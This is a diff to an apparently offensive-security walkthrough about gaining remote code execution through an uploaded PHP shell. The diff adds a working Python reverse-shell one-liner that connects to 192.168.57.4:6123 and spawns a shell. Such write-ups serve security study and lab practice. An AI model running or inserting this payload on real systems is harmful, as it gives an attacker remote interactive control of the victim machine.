@@ -93,6 +93,8 @@ After creating a PHP shell with the characteristics that we have already identif
 ![Uploading](https://github.com/Alta-Cupula/Offensive/blob/main/requisicao.png)
 ![RCE](https://github.com/Alta-Cupula/Offensive/blob/main/rce.png)
 
+```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.57.4",6123));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ```
+
 Using python we got the reverse shell.
 ![Reverse](https://github.com/Alta-Cupula/Offensive/blob/main/reverse.png)
 
